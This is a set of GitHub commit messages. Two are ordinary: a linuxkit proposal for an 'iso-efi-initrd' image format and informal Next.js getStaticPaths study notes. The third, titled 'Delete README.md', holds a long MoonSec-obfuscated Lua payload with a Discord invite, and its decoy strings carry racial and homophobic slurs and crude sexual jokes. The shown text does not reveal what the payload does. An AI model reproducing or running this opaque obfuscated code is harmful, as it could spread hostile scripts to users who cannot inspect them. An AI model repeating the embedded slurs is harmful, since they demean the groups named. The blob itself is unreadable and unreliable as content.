`iso-efi` only loads the kernel at boot, and the root filesystem is mounted from the actual boot media (eg, a CD-ROM - physical or emulated). This can often cause trouble (it has for us) for multiple reasons:
- the linuxkit kernel might not have the correct drivers built-in for the hardware (see #3154)
- especially with virtual or emulated CD-ROMs, performance can be abysmal: we saw the case where the server IPMI allowed using a ISO stored in AWS S3 over HTTP...you can imagine what happens when you start doing random I/O on the root fs in that case.
- The ISO image has the root device name baked in (ie, `/dev/sr0`) which fails if for some reason the CD-ROM we're running from doesn't end up using that device, so manual tweaking is required (see #2375)

`iso-efi-initrd`, on the other hand, packs the root filesystem as an initramfs (ie similar to what the raw output does, except that in this case we're preparing an ISO image), so both the kernel and the initramfs are loaded in memory by the boot loader and, once running, we don't need to worry about root devices or kernel drivers (and the speed is good, as everything runs in RAM).

Also, the generated ISO can be copied verbatim (eg with `dd`) onto a USB media and it still works.

Finally, the image size is much smaller compared to `iso-efi`.

IMHO, `iso-efi-initrd` could be used almost anywhere `iso-efi` would be used, or might even supersede it. I can't think of a scenario where one might explicitly want to use `iso-efi`.

Points to consider:

- Not tested under aarch64 as I don't have access to that arch. If the automated CI tests also test that, then it should be fine.
- I'm not sure what to put inside `images.yaml` for the `iso-efi-initrd` image. As it is it works of course (my personal image on docker hub), but I guess it'll have to be some more "official" image. However, that cannot be until this PR is merged, so it's kind of a chicken and egg situation. Please advise.
- I can look into adding the corresponding `iso-bios-initrd` builder if there is interest.

![cute seal](https://sites.psu.edu/siowfa16/files/2016/09/baby-seal-29vsgyf-288x300.jpg)

Signed-off-by: Davide Brini <waldner@katamail.com>

---
## [SoubranMx/React-Courses](https://github.com/SoubranMx/React-Courses)@[e1b6b49454...](https://github.com/SoubranMx/React-Courses/commit/e1b6b4945484021e670f50737a56ec61dc775743)
#### Monday 2022-08-01 19:07:57 by Uriel Soubran

IMPORTANT: getStaticPaths

Woooh, there's a lot of things to understand here.

Again, see the video Section 04: 52. Next - getStaticPaths and 53. Generando las 151 páginas de Pokémons

Where to even begin?

You write the getStaticPaths function before the getStaticProps. Not sure if it NEEDS to be before, but anyway.

GetstaticPaths is the one in charge to create ALL 151 PAGES when yarn build.

Later on, getStaticPaths allows StaticProps to obtain the params on the url, in this case, just the id as a string, using the context.
The context has way more properties, but we destructure it to obtain only params.

From the params, we obtain the id, and with that ID we axios the shit out of the pokemon ID.

We send that data as props to the page and there you can do whatever the hell you want with it.

In dev mode it is slow af, but when you yarn build, the build process is the one and only time it will be slow, because it is fetching the data and stuff from all 151 pokemons.

Once it finishes, yarn start will serve all the pages and it will be smooth fast... tho, not as fast as simple React App with vite or CRA.

---
## [StarXhub1/Car-DealarShip-tycoon](https://github.com/StarXhub1/Car-DealarShip-tycoon)@[a6886a2986...](https://github.com/StarXhub1/Car-DealarShip-tycoon/commit/a6886a29863e1e977ffac5ff3172e3b0553f165d)
#### Monday 2022-08-01 19:23:16 by StarXhub1

Delete README.md

_, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'


,nil,nil;(function() _msec=(function(e,l,o)local W=l["㒙㒞㒢㒡㒠㒞㒗㒙㒛㒡㒤"];local T=o[e[(0x2a148/248)]][e["㒛㒞㒛㒠㒢㒠㒝㒝㒝㒦㒢㒘㒡㒚"]];local _=(-#{'}','}',{};(function()return#{('LfHKBo'):find("\72")}>0 and 1 or 0 end);{};43,1}+11)/(((334750/0x67)/50)-0x3f)local i=(83-(-#'atakan der nigga'+(((-18542/(0x252-340))+-#[[furries should die]])+0xbc)))-(238/0xee)local j=o[e[((31486/0xb6)+-#[[ur mom is hot]])]][e["㒥㒝㒟㒟㒟㒞㒚㒥"]];local y=(46/((((347+-0x70)+-#[[never gonna give you up never gonna let you down]])+-0x7f)+-#"moonsex is bad"))+(0x83-129)local H=o[e[(528+-#{1,66;11})]][e["㒞㒟㒛㒟㒝㒢㒚㒗㒠"]]local n=(0x15e/175)-(0xde/(0x4e0c/(0x9f+(-0x2fb5/177))))local h=(129/((231-((0x26a-((802-0x1b9)+-#[[my ass hurts]]))+-101))+-#[[free pornhub premium]]))local U=(-#'When the'+((-#{(function()return#{('lfbpFo'):find("\98")}>0 and 1 or 0 end),",";82}+142)-128))local s=((0x598/((46680/((805-0x1c4)-0xe9))-0xd2))+-#'Asses')local O=(-#{1;'nil',59;'}'}+7)local u=((-#"when the he went where when he where where when the he when ther wher he then here went"+((1668+-#{1;63;(function()return#{('HBKKLP'):find("\75")}>0 and 1 or 0 end)})-0x36f))/0xe9)local t=((0x6f-(-#{15,'nil';15}+71))+-#[[You have been banned from Cfx re network]])local w=(99-((0x44e9e0/(0x9242/193))/0xf0))local b=(((-#{13,(function()return#{('pHOPoK'):find("\79")}>0 and 1 or 0 end),128}+199)-147)-47)local f=(((-#[[Impulse youtube ez]]+(((24-0x46)+-78)+306))-0x5f)+-0x43)local x=(((-#{",";64;(function()return#{('HPfoHl'):find("\102")}>0 and 1 or 0 end),(function()return#{('HPfoHl'):find("\102")}>0 and 1 or 0 end);64;(function()return#{('HPfoHl'):find("\102")}>0 and 1 or 0 end),(function()return{','}end)()}+59)+-0x65)+51)local c=((-#{11;11,'}'}+459)/0xe4)local k=(((-#"furries should die"+(-0x7896/(116-0x51)))/0x9)+102)local C=(0x318/(40986/((-0x1a+18656)/0x5a)))local N=(83+(-#'cilertedcool'+((-#"fico éreto para mulheres japonesas"+(5610/(-89+0x158)))-0x37)))local S=(((394+(-9+(-0x2235/139)))+-#"ohhhh nice code thanks")/75)local B=(21+(-1088/(157-((-117+0x102)+-#"never gonna give you up never gonna let you down"))))local M=(-#'freerobuxphone'+(((-43+(569-(-#"holy shit"+(0x2d9-400))))+-#'Axeo of the worst boronide forks Includes nocredito dumpedito nigedito')-118))local g=((2008-((-#'i bought a boost for this string'+(0x4ba+-103))+-0x2f))/0xf5)local K=e[(0x1ffe0/96)];local q=o[e[(-#[[Suck Sus0587]]+(-112+0x11c))]][e["㒛㒡㒥㒙㒣㒛㒞㒡㒙㒛㒢㒦㒤㒡㒘㒣㒣㒗㒙"]];local F=o[(function(e)return type(e):sub(1,1)..'\101\116'end)('㒟㒚㒝㒝㒢㒥㒥㒥')..'\109\101'..('\116\97'or'㒝㒞㒝㒤㒢㒘㒘㒘')..e[(602+-0x4d)]];local m=o[e[((-37+0x23f)+-#[[nerd emoji x7]])]][e["㒢㒦㒙㒠㒚㒡㒘㒣㒦㒥㒜㒣"]];local v=(70-0x44)-((((-0x49b4/178)+-0x1e67)/0xa1)+51)local p=(506/(((0x525-675)+-#'ur mom is hot')-376))-(0xe0/112)local z=o[e[(166+-#{175,1,47;47,47;1})]][e["㒚㒥㒠㒘㒜㒚㒠㒢㒦㒟㒘㒙"]];local d=function(e,o)return e..o end local I=(0x1f-27)*(504/(((0x6c5c/76)+-0x7a)+-#[[Ok guys relax Theyre just fucking socks Its impossible for socks to turn me gay My heterosexuality will be fine dudes]]))local Y=o[e["㒡㒞㒙㒘㒣㒜㒘㒤㒛㒝㒛"]];local r=(-#'no dick no balls'+(2772/0x9a))*(368-(276+(-0xe34/101)))local A=(207872/0xcb)*(((0x15c3-(2895+-0x54))/0x45)+-#'i still cannot find who the fuck asked')local J=(0x514/(((0x1a91+-105)/0x5d)+-#'funtime foxy and funtime freddy having sex real'))local D=(-#'thats not nice'+(0xd30/(-#"Cock and ball tortue"+((0x18d37-50867)/0xdc))))*(0x2b+-41)local P=o[e["㒢㒦㒗㒙㒠㒜㒤㒗"]]or o[e[(-#'get some bitches'+(112528/0xd0))]][e["㒢㒦㒗㒙㒠㒜㒤㒗"]];local a=((((8337446-0x3f9c45)/67)+-#"free luraph")/243)local e=o[e["㒥㒛㒤㒠㒡㒟㒗㒙㒢"]];local H=(function(a)local r,l=3,0x10 local o={j={},v={}}local d=-n local e=l+i while true do o[a:sub(e,(function()e=r+e return e-i end)())]=(function()d=d+n return d end)()if d==(I-n)then d=""l=v break end end local d=#a while e<d+i do o.v[l]=a:sub(e,(function()e=r+e return e-i end)())l=l+n if l%_==v then l=p m(o.j,(z((o[o.v[p]]*I)+o[o.v[n]])))end end return H(o.j)end)("..:::MoonSec::..㒗㒘㒙㒚㒛㒜㒝㒞㒟㒠㒡㒢㒣㒤㒥㒦㒤㒘㒚㒤㒢㒠㒡㒤㒡㒘㒛㒢㒟㒥㒞㒤㒞㒘㒝㒜㒠㒣㒢㒠㒢㒗㒡㒣㒠㒞㒤㒚㒘㒟㒗㒜㒦㒠㒥㒤㒛㒠㒛㒠㒚㒤㒙㒤㒥㒢㒤㒛㒣㒟㒝㒘㒟㒡㒞㒜㒝㒠㒜㒤㒠㒥㒡㒝㒡㒗㒠㒢㒟㒡㒟㒠㒞㒥㒝㒘㒜㒝㒥㒞㒥㒡㒣㒤㒣㒘㒢㒜㒦㒢㒗㒙㒗㒘㒦㒘㒥㒙㒤㒗㒣㒙㒣㒠㒡㒥㒡㒘㒟㒛㒠㒠㒟㒟㒞㒦㒝㒙㒜㒣㒛㒥㒚㒠㒥㒘㒣㒜㒢㒠㒡㒤㒥㒠㒗㒡㒦㒝㒤㒥㒤㒦㒤㒛㒣㒙㒢㒘㒠㒚㒡㒛㒠㒟㒠㒘㒝㒘㒝㒝㒝㒢㒝㒘㒚㒤㒥㒛㒣㒠㒢㒤㒢㒘㒗㒠㒗㒣㒦㒚㒡㒘㒤㒥㒤㒣㒞㒤㒢㒠㒡㒝㒡㒢㒠㒡㒟㒤㒞㒡㒞㒣㒞㒗㒣㒜㒥㒟㒤㒠㒣㒤㒣㒘㒗㒘㒗㒥㒗㒛㒥㒤㒠㒚㒞㒠㒝㒤㒝㒘㒢㒣㒡㒡㒡㒡㒠㒝㒠㒟㒞㒥㒞㒢㒞㒛㒜㒡㒘㒟㒛㒜㒛㒜㒚㒠㒙㒠㒥㒢㒡㒣㒠㒜㒟㒠㒞㒤㒤㒛㒣㒤㒢㒥㒢㒗㒡㒣㒠㒟㒟㒡㒟㒠㒞㒤㒝㒡㒝㒢㒛㒠㒥㒜㒤㒜㒣㒠㒢㒤㒗㒘㒗㒝㒗㒢㒗㒘㒦㒢㒞㒥㒝㒠㒜㒤㒜㒘㒟㒞㒡㒟㒠㒘㒠㒡㒜㒢㒞㒟㒝㒦㒜㒛㒛㒡㒤㒢㒤㒘㒣㒘㒢㒜㒡㒠㒥㒡㒦㒙㒥㒥㒥㒞㒣㒠㒝㒛㒜㒜㒛㒠㒚㒤㒠㒦㒟㒡㒠㒗㒦㒦㒗㒡㒦㒜㒥㒠㒤㒤㒙㒟㒙㒝㒙㒜㒘㒟㒘㒛㒗㒜㒥㒥㒥㒙㒤㒜㒝㒞㒝㒤㒛㒤㒛㒘㒚㒜㒞㒣㒟㒙㒟㒜㒜㒜㒝㒢㒜㒝㒛㒥㒚㒝㒚㒢㒚㒝㒗㒘㒗㒝㒗㒢㒗㒘㒣㒛㒢㒢㒤㒢㒢㒥㒢㒥㒡㒡㒙㒢㒚㒗㒙㒘㒘㒜㒗㒠㒚㒥㒛㒘㒙㒥㒚㒜㒤㒝㒣㒘㒢㒜㒡㒠㒗㒗㒦㒠㒥㒝㒥㒢㒣㒥㒣㒛㒣㒠㒡㒥㒡㒦㒣㒠㒙㒥㒘㒠㒗㒤㒗㒘㒝㒣㒛㒡㒛㒠㒚㒣㒚㒟㒙㒠㒘㒙㒗㒝㒦㒠㒟㒢㒟㒛㒞㒘㒝㒜㒜㒠㒠㒗㒡㒡㒡㒠㒠㒙㒠㒞㒞㒝㒞㒚㒥㒢㒦㒝㒥㒘㒤㒜㒣㒠㒘㒛㒙㒗㒘㒞㒗㒛㒗㒗㒦㒘㒤㒝㒣㒣㒣㒙㒙㒜㒛㒥㒚㒠㒙㒤㒙㒘㒝㒜㒞㒜㒜㒥㒝㒡㒛㒡㒛㒢㒘㒛㒚㒝㒘㒥㒣㒠㒠㒤㒠㒘㒟㒜㒞㒠㒙㒚㒝㒢㒜㒜㒛㒠㒚㒤㒞㒢㒠㒟㒟㒟㒞㒢㒛㒜㒜㒡㒛㒣㒛㒣㒚㒜㒙㒡㒡㒢㒢㒜㒡㒘㒠㒜㒟㒠㒢㒥㒥㒝㒤㒠㒣㒟㒠㒚㒡㒙㒡㒞㒠㒝㒜㒢㒘㒢㒗㒜㒦㒠㒥㒤㒚㒛㒛㒡㒚㒢㒙㒚㒘㒙㒗㒟㒦㒥㒤㒛㒦㒝㒤㒥㒡㒞㒝㒘㒜㒘㒛㒜㒚㒠㒠㒛㒟㒙㒟㒙㒝㒥㒚㒢㒦㒛㒥㒜㒤㒠㒣㒤㒗㒝㒗㒟㒦㒠㒠㒦㒠㒛㒟㒜㒞㒠㒝㒤㒡㒟㒢㒡㒢㒤㒙㒦㒛㒗㒙㒜㒘㒠㒗㒤㒛㒛㒝㒘㒜㒙㒛㒗㒚㒣㒥㒜㒗㒤㒘㒣㒣㒘㒥㒟㒥㒥㒥㒠㒤㒝㒣㒟㒣㒤㒣㒞㒛㒚㒚㒜㒙㒠㒘㒤㒟㒗㒞㒟㒣㒤㒦㒚㒥㒘㒤㒜㒣㒠㒚㒗㒘㒠㒗㒝㒦㒤㒦㒣㒦㒟㒝㒞㒞㒛㒜㒤㒜㒘㒛㒜㒟㒞㒠㒙㒠㒟㒜㒠㒞㒢㒝㒣㒝㒘㒛㒠㒛㒟㒛㒛㒙㒦㒢㒞㒡㒥㒠㒤㒠㒘㒟㒜㒥㒤㒣㒥㒣㒚㒣㒘㒡㒥㒦㒚㒚㒣㒙㒜㒘㒠㒗㒤㒛㒛㒜㒥㒜㒤㒛㒝㒛㒢㒙㒡㒙㒞㒙㒗㒗㒠㒦㒥㒦㒠㒤㒠㒞㒦㒝㒜㒜㒠㒛㒤㒠㒛㒠㒡㒠㒜㒟㒙㒞㒛㒞㒠㒘㒠㒚㒤㒛㒤㒚㒝㒛㒙㒙㒙㒙㒚㒣㒝㒤㒞㒠㒠㒟㒘㒞㒜㒝㒠㒡㒝㒢㒦㒢㒢㒡㒟㒠㒟㒟㒝㒝㒟㒝㒥㒝㒦㒝㒞㒛㒡㒛㒢㒛㒞㒣㒝㒢㒜㒡㒠㒠㒤㒗㒘㒥㒝㒥㒙㒤㒦㒤㒛㒣㒦㒛㒥㒚㒤㒚㒘㒙㒜㒝㒘㒞㒣㒝㒦㒜㒡㒝㒙㒦㒤㒤㒠㒣㒜㒢㒠㒡㒤㒥㒠㒗㒠㒦㒤㒥㒤㒣㒘㒤㒛㒣㒣㒣㒘㒦㒞㒚㒠㒙㒠㒘㒤㒘㒘㒜㒘㒜㒥㒜㒚㒜㒜㒦㒜㒤㒘㒢㒤㒢㒘㒡㒜㒥㒙㒦㒢㒦㒛㒥㒠㒣㒡㒣㒢㒢㒛㒡㒡㒚㒢㒚㒛㒙㒘㒘㒜㒗㒠㒛㒜㒝㒜㒜㒠㒛㒠㒘㒛㒙㒝㒙㒠㒙㒚㒡㒝㒠㒘㒟㒜㒞㒠㒢㒗㒤㒚㒢㒡㒡㒡㒢㒘㒠㒝㒞㒘㒟㒙㒝㒦㒜㒤㒦㒣㒥㒠㒤㒤㒤㒘㒗㒟㒙㒟㒘㒦㒗㒝㒤㒣㒦㒥㒥㒝㒗㒠㒝㒡㒜㒠㒛㒤㒛㒘㒟㒞㒠㒙㒟㒛㒞㒠㒞㒠㒘㒠㒦㒙㒥㒘㒤㒜㒣㒠㒗㒚㒙㒗㒘㒞㒦㒣㒦㒙㒜㒜㒞㒥㒝㒠㒜㒤㒜㒘㒢㒣㒠㒥㒟㒦㒟㒠㒟㒛㒞㒟㒝㒟㒚㒡㒙㒠㒦㒠㒤㒙㒣㒘㒢㒜㒡㒠㒦㒙㒤㒜㒥㒥㒥㒝㒠㒦㒠㒦㒜㒦㒛㒠㒚㒤㒚㒘㒝㒣㒞㒥㒟㒘㒜㒛㒜㒡㒜㒢㒜㒚㒚㒡㒙㒟㒘㒥㒛㒜㒡㒡㒠㒜㒟㒠㒞㒤㒢㒛㒣㒤㒢㒡㒢㒦㒡㒙㒠㒟㒠㒤㒟㒙㒟㒚㒛㒚㒗㒗㒥㒤㒥㒘㒤㒜㒘㒠㒙㒠㒘㒙㒘㒥㒦㒥㒦㒦㒦㒛㒞㒞㒝㒦㒜㒤㒜㒘㒛㒜㒟㒝㒠㒣㒟㒦㒟㒗㒝㒥㒞㒝㒛㒤㒥㒤㒤㒠㒣㒤㒣㒘㒦㒝㒗㒤㒗㒚㒥㒠㒥㒝㒣㒟㒤㒤㒤㒞㒠㒚㒜㒙㒚㒤㒚㒘㒙㒜㒝㒣㒝㒘㒛㒙㒛㒞㒛㒘㒦㒤㒚㒠㒚㒡㒘㒢㒝㒚㒡㒛㒠㒜㒟㒠㒞㒤㒣㒘㒤㒘㒣㒢㒥㒜㒛㒦㒚㒜㒙㒠㒘㒤㒜㒦㒝㒡㒞㒗㒝㒘㒜㒗㒛㒚㒚㒣㒙㒣㒘㒞㒘㒠㒥㒚㒥㒗㒤㒗㒣㒚㒜㒢㒝㒟㒜㒘㒛㒜㒚㒠㒞㒛㒟㒝㒟㒠㒛㒣㒝㒜㒜㒡㒜㒘㒚㒤㒚㒦㒙㒝㒙㒚㒞㒤㒡㒟㒠㒘㒟㒜㒞㒠㒢㒗㒣㒤㒢㒥㒡㒣㒡㒟㒜㒘㒞㒠㒟㒟㒙㒤㒜㒜㒛㒜㒢㒤㒦㒜㒤㒘㒣㒜㒢㒠㒘㒤㒗㒙㒗㒟㒦㒤㒥㒙㒤㒚㒣㒥㒣㒞㒞㒢㒡㒛㒡㒛㒠㒝㒛㒣㒟㒚㒝㒝㒞㒗㒘㒣㒜㒝㒙㒗㒦㒣㒦㒛㒦㒞㒗㒦㒤㒥㒟㒦㒟㒠㒞㒜㒝㒠㒜㒤㒡㒛㒡㒟㒡㒢㒠㒙㒟㒦㒜㒣㒞㒥㒝㒝㒦㒚㒥㒝㒤㒠㒣㒤㒣㒘㒘㒛㒞㒤㒡㒚㒠㒘㒟㒜㒞㒠㒢㒤㒣㒤㒢㒝㒣㒙㒡㒙㒡㒚㒠㒦㒘㒤㒗㒤㒗㒘㒦㒜㒜㒗㒚㒥㒚㒥㒙㒡㒟㒤㒢㒣㒡㒘㒠㒜㒟㒠㒢㒥㒤㒜㒣㒠㒠㒥㒣㒚㒡㒝㒡㒚㒠㒤㒝㒜㒞㒙㒞㒚㒜㒤㒜㒠㒛㒝㒛㒞㒝㒘㒣㒚㒢㒘㒡㒜㒠㒠㒤㒦㒥㒝㒥㒙㒤㒟㒤㒘㒢㒝㒤㒤㒛㒛㒙㒤㒙㒘㒘㒜㒞㒜㒝㒙㒜㒙㒛㒠㒚㒥㒚㒦㒚㒛㒙㒠㒗㒡㒘㒘㒗㒛㒟㒞㒟㒛㒝㒤㒝㒘㒜㒜㒟㒡㒡㒘㒠㒥㒟㒥㒟㒞㒜㒦㒝㒝㒝㒙㒜㒟㒜㒘㒚㒝㒞㒢㒢㒦㒡㒤㒡㒘㒠㒜㒦㒙㒥㒢㒥㒛㒣㒡㒣㒢㒣㒘㒢㒢㒚㒣㒙㒠㒘㒤㒘㒘㒜㒢㒜㒥㒜㒗㒜㒜㒛㒛㒚㒢㒦㒗㒟㒜㒢㒡㒠㒠㒟㒤㒟㒘㒤㒠㒤㒙㒤㒗㒢㒛㒢㒛㒡㒢㒠㒘㒛㒦㒞㒣㒞㒗㒙㒣㒜㒟㒚㒝㒘㒥㒘㒜㒦㒚㒙㒡㒗㒚㒘㒜㒥㒝㒦㒗㒦㒚㒞㒞㒝㒘㒜㒜㒛㒠㒟㒢㒠㒝㒠㒣㒝㒣㒞㒙㒝㒛㒝㒠㒜㒙㒛㒣㒚㒦㒢㒞㒣㒠㒡㒤㒡㒘㒠㒜㒤㒢㒥㒙㒤㒞㒤㒞㒢㒥㒣㒗㒡㒠㒜㒜㒝㒤㒟㒦㒟㒗㒞㒜㒜㒤㒜㒣㒜㒟㒛㒚㒛㒚㒣㒝㒢㒘㒡㒜㒠㒠㒣㒦㒦㒗㒤㒠㒥㒙㒡㒚㒣㒗㒢㒞㒠㒣㒠㒙㒜㒦㒙㒘㒗㒠㒦㒤㒦㒘㒜㒤㒙㒢㒚㒦㒚㒡㒦㒠㒦㒟㒥㒜㒤㒢㒤㒢㒣㒝㒣㒦㒣㒣㒗㒢㒜㒘㒚㒤㒚㒘㒙㒜㒞㒢㒞㒝㒞㒜㒙㒚㒛㒢㒜㒜㒛㒗㒚㒞㒝㒦㒢㒘㒡㒘㒠㒜㒟㒠㒦㒘㒤㒡㒤㒙㒢㒥㒗㒚㒛㒠㒚㒜㒙㒠㒘㒤㒜㒚㒞㒛㒜㒤㒝㒝㒙㒟㒛㒥㒚㒢㒙㒣㒗㒤㒡㒠㒠㒠㒟㒤㒟㒘㒣㒚㒣㒡㒣㒡㒢㒝㒟㒚㒛㒗㒙㒤㒙㒘㒘㒜㒝㒦㒝㒦㒝㒗㒜㒙㒙㒢㒘㒛㒗㒚㒢㒞㒢㒙㒠㒤㒠㒘㒟㒜㒣㒞㒤㒙㒤㒟㒡㒠㒢㒟㒡㒛㒠㒟㒠㒘㒞㒥㒟㒞㒗㒛㒦㒜㒥㒠㒤㒤㒚㒙㒚㒜㒙㒙㒡㒦㒡㒢㒠㒜㒟㒠㒞㒤㒤㒡㒤㒟㒣㒜㒢㒗㒡㒤㒡㒛㒠㒣㒠㒙㒟㒚㒝㒡㒡㒦㒦㒘㒥㒘㒤㒜㒣㒠㒗㒗㒘㒙㒘㒟㒗㒘㒥㒠㒟㒢㒞㒜㒝㒠㒜㒤㒡㒜㒢㒛㒡㒗㒠㒛㒟㒤㒞㒡㒜㒙㒝㒢㒜㒞㒜㒛㒘㒞㒤㒝㒣㒘㒢㒜㒡㒠㒗㒛㒦㒙㒦㒙㒤㒥㒥㒗㒣㒝㒣㒚㒢㒣㒡㒙㒥㒞㒚㒘㒘㒠㒗㒤㒗㒘㒚㒝㒛㒤㒛㒘㒘㒝㒚㒤㒙㒤㒘㒦㒗㒙㒤㒟㒥㒡㒦㒗㒤㒠㒤㒦㒝㒗㒛㒤㒛㒘㒚㒜㒞㒘㒠㒘㒟㒜㒞㒜㒛㒗㒜㒙㒜㒜㒡㒠㒤㒘㒢㒤㒢㒘㒡㒜㒥㒘㒗㒙㒥㒥㒤㒝㒤㒞㒣㒣㒢㒡㒡㒠㒙㒢㒚㒝㒙㒘㒘㒜㒗㒠㒞㒛㒝㒗㒜㒞㒛㒛㒛㒗㒚㒘㒘㒝㒗㒣㒗㒙㒝㒜㒟㒦㒞㒠㒝㒤㒝㒘㒠㒢㒢㒙㒡㒦㒠㒝㒞㒟㒞㒥㒞㒦㒞㒞㒜㒡㒜㒢㒘㒢㒤㒣㒣㒜㒢㒠㒡㒤㒥㒤㒗㒛㒥㒣㒤㒥㒤㒤㒢㒜㒣㒜㒡㒥㒢㒡㒠㒡㒠㒢㒢㒜㒘㒝㒗㒜㒦㒠㒥㒤㒙㒛㒚㒤㒙㒥㒚㒗㒙㒜㒜㒢㒠㒤㒟㒤㒟㒘㒞㒜㒢㒘㒣㒙㒢㒙㒡㒠㒚㒢㒚㒘㒙㒘㒘㒜㒗㒠㒝㒤㒜㒙㒜㒞㒛㒤㒝㒜㒣㒢㒢㒜㒡㒠㒠㒤㒦㒗㒥㒛㒥㒣㒤㒙㒣㒛㒣㒡㒢㒢㒡㒙㒠㒝㒠㒝㒞㒜㒘㒟㒗㒘㒦㒜㒥㒠㒙㒠㒚㒝㒙㒝㒘㒤㒘㒙㒘㒚㒦㒞㒦㒟㒤㒥㒥㒚㒣㒠㒦㒘㒜㒡㒛㒘㒚㒜㒙㒠㒞㒥㒟㒘㒝㒥㒙㒟㒝㒛㒛㒝㒚㒞㒚㒘㒙㒣㒙㒗㒘㒗㒗㒣㒢㒣㒚㒞㒞㒢㒝㒠㒜㒤㒜㒘㒠㒜㒡㒜㒟㒥㒠㒡㒞㒡㒞㒢㒤㒘㒦㒡㒥㒜㒤㒠㒣㒤㒗㒦㒘㒡㒙㒗㒤㒦㒗㒝㒦㒠㒥㒤㒤㒣㒣㒦㒜㒞㒜㒗㒚㒤㒚㒘㒙㒜㒜㒡㒟㒙㒞㒜㒝㒛㒗㒠㒚㒘㒛㒘㒥㒜㒣㒚㒡㒤㒡㒘㒠㒜㒤㒛㒥㒝㒤㒛㒤㒗㒡㒠㒢㒠㒡㒙㒡㒥㒟㒥㒟㒦㒘㒚㒗㒦㒦㒠㒥㒤㒥㒘㒘㒣㒙㒥㒚㒘㒗㒛㒗㒡㒗㒢㒗㒚㒥㒡㒤㒟㒣㒥㒘㒚㒜㒠㒛㒜㒚㒠㒙㒤㒞㒛㒞㒡㒞㒤㒜㒗㒜㒛㒜㒛㒛㒢㒚㒙㒚㒢㒢㒡㒡㒠㒠㒤㒠㒘㒤㒙㒥㒟㒤㒢㒣㒝㒣㒥㒝㒠㒛㒛㒚㒘㒙㒜㒘㒠㒞㒘㒝㒡㒝㒟㒛㒣㒛㒣㒛㒚㒙㒠㒦㒞㒦㒜㒡㒘㒠㒜㒟㒠㒥㒜㒥㒜㒤㒠㒣㒠㒣㒗㒞㒢㒝㒛㒜㒟㒟㒦㒞㒙㒞㒣㒙㒞㒜㒛㒛㒡㒛㒠㒚㒘㒚㒙㒘㒚㒘㒡㒗㒣㒦㒙㒦㒚㒤㒟㒤㒟㒣㒢㒣㒜㒡㒡㒡㒞㒡㒘㒛㒦㒞㒟㒞㒟㒝㒡㒙㒗㒜㒤㒙㒘㒚㒙㒚㒘㒙㒠㒗㒣㒣㒣㒤㒣㒥㒝㒥㒦㒤㒣㒟㒥㒡㒡㒠㒙㒝㒡㒞㒤㒟㒥㒞㒢㒞㒦㒝㒙㒝㒞㒝㒙㒗㒣㒚㒥㒙㒝㒙㒙㒘㒢㒤㒗㒗㒟㒦㒟㒦㒙㒥㒚㒣㒟㒢㒥㒞㒢㒡㒤㒡㒡㒟㒡㒠㒞㒘㒜㒗㒜㒦㒠㒥㒤㒙㒠㒚㒡㒙㒡㒙㒘㒤㒘㒡㒡㒠㒠㒟㒤㒟㒘㒣㒟㒣㒣㒣㒣㒣㒚㒡㒡㒢㒚㒚㒜㒙㒘㒘㒜㒗㒠㒚㒦㒝㒗㒛㒠㒜㒙㒘㒛㒚㒡㒙㒞㒘㒟㒟㒦㒠㒜㒟㒜㒞㒠㒝㒤㒡㒞㒠㒝㒠㒢㒟㒡㒙㒚㒙㒤㒘㒠㒗㒤㒗㒘㒚㒟㒛㒡㒛㒠㒚㒤㒙㒞㒘㒡㒘㒗㒗㒣㒙㒤㒟㒤㒞㒤㒞㒘㒝㒜㒡㒚㒣㒗㒢㒗㒡㒚㒣㒘㒙㒘㒘㒘㒗㒜㒦㒠㒜㒛㒛㒙㒛㒙㒙㒥㒞㒚㒢㒞㒡㒜㒠㒠㒟㒤㒣㒙㒥㒙㒤㒟㒤㒙㒢㒦㒢㒠㒤㒘㒚㒠㒙㒘㒘㒜㒗㒠㒜㒘㒝㒚㒛㒥㒛㒗㒚㒛㒙㒝㒙㒞㒥㒥㒘㒚㒦㒝㒦㒚㒥㒤㒝㒦㒝㒢㒜㒜㒛㒠㒚㒤㒠㒤㒠㒛㒞㒡㒞㒘㒞㒛㒝㒠㒜㒢㒛㒝㒚㒦㒙㒣㒢㒢㒢㒚㒡㒘㒠㒜㒟㒠㒣㒢㒤㒝㒤㒣㒡㒤㒡㒥㒡㒚㒜㒜㒚㒙㒘㒤㒘㒘㒗㒜㒚㒤㒛㒥㒜㒚㒛㒗㒘㒤㒙㒜㒘㒝㒘㒙㒦㒥㒙㒜㒟㒞㒞㒜㒝㒠㒜㒤㒣㒠㒢㒜㒠㒣㒟㒥㒟㒤㒟㒘㒤㒤㒗㒘㒦㒘㒥㒜㒤㒠㒘㒜㒙㒝㒘㒝㒗㒤㒥㒥㒠㒘㒟㒜㒞㒠㒝㒦㒢㒜㒜㒜㒛㒠㒚㒤㒚㒝㒙㒜㒘㒠㒗㒤㒘㒚㒚㒠㒥㒠㒤㒤㒤㒘㒙㒛㒢㒠㒡㒤㒡㒘㒠㒜㒟㒠㒞㒤㒞㒘㒝㒜㒜㒠㒛㒤㒛㒘㒚㒜㒙㒠㒘㒤㒘㒘㒗㒝㒦㒠㒥㒤㒥㒘㒤㒜㒣㒠㒣㒦㒢㒘㒡㒜㒠㒡㒟㒤㒣㒢㒞㒜㒝㒠㒜㒤㒝㒚㒛㒜㒚㒠㒙㒥㒙㒘㒜㒙㒗㒠㒦㒤㒦㒘㒗㒢㒤㒠㒣㒤㒣㒙㒢㒜㒢㒙㒠㒤㒠㒙㒟㒜㒢㒦㒝㒤㒝㒜㒝㒣㒛㒠㒚㒤㒚㒘㒙㒥㒘㒠㒗㒥㒗㒘㒦㒠㒗㒗㒤㒤㒤㒘㒣㒜㒣㒚㒡㒤㒡㒙㒠㒜㒟㒠㒦㒗㒞㒘㒝㒜㒜㒠㒛㒥㒛㒘㒚㒜㒙㒠㒘㒦㒝㒜㒗㒜㒦㒡㒥㒤㒥㒙㒤㒜㒣㒠㒢㒤㒣㒚㒡㒝㒠㒠㒟㒥㒟㒘㒡㒡㒝㒠㒜㒤㒜㒘㒜㒞㒚㒠㒙㒤㒙㒙㒘㒜㒞㒤㒦㒤㒦㒘㒥㒜㒥㒢㒣㒤㒣㒘㒢㒞㒡㒠㒤㒣㒠㒘㒟㒜㒞㒠㒟㒤㒝㒘㒜㒜㒛㒢㒚㒤㒚㒚㒙㒜㒛㒚㒗㒤㒘㒚㒦㒜㒥㒠㒥㒘㒤㒘㒙㒦㒢㒠㒡㒤㒡㒘㒠㒜㒟㒠㒞㒤㒞㒚㒝㒜㒜㒤㒛㒤㒛㒘㒚㒜㒙㒠㒘㒤㒘㒘㒗㒝